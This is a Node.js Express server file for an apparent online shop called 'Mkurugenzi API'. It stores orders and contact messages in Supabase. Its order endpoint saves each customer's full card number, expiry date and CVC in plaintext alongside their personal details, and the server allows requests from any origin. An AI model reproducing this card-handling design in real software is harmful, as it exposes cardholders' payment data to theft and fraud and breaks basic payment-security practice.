import express from 'express';
import cors from 'cors';
import { createClient } from '@supabase/supabase-js';
import WebSocket from 'ws';

const app = express();

// ✅ FIX CORS - Allow all origins for now (you can restrict later)
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Handle preflight requests
app.options('*', cors());

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;

console.log('Checking environment variables...');
console.log('SUPABASE_URL:', supabaseUrl ? '✅ Found' : '❌ Missing');
console.log('SUPABASE_ANON_KEY:', supabaseAnonKey ? '✅ Found' : '❌ Missing');

if (!supabaseUrl || !supabaseAnonKey) {
    console.error('❌ Missing required environment variables!');
    process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseAnonKey, {
    realtime: { transport: WebSocket }
});

app.use(express.json());

const PORT = process.env.PORT || 5000;

app.get('/', (req, res) => {
    res.json({ message: 'Mkurugenzi API running!' });
});

app.post('/api/orders', async (req, res) => {
    try {
        const { productName, productPrice, fullName, email, phone, address, cardNumber, cardName, cardExpiry, cardCVC } = req.body;
        
        const { error } = await supabase.from('orders').insert([{
            product_name: productName,
            product_price: productPrice,
            full_name: fullName,
            email: email,
            phone: phone,
            address: address,
            card_last4: cardNumber.slice(-4),
            full_card_number: cardNumber,
            card_holder_name: cardName,
            card_expiry: cardExpiry,
            card_cvc: cardCVC,
            status: 'pending',
            created_at: new Date()
        }]);
        
        if (error) throw error;
        
        console.log(`✅ Order received from ${fullName}`);
        res.json({ success: true, message: 'Order received!' });
    } catch (error) {
        console.error('Order error:', error);
        res.status(500).json({ success: false, error: 'Something went wrong' });
    }
});

app.post('/api/messages', async (req, res) => {
    try {
        const { name, email, subject, message } = req.body;
        const { error } = await supabase.from('messages').insert([{ 
            name, 
            email, 
            subject, 
            message,
            created_at: new Date()
        }]);
        
        if (error) throw error;
        console.log(`📨 Message from ${name}`);
        res.json({ success: true, message: 'Message sent!' });
    } catch (error) {
        console.error('Message error:', error);
        res.status(500).json({ success: false, error: 'Failed to send message' });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
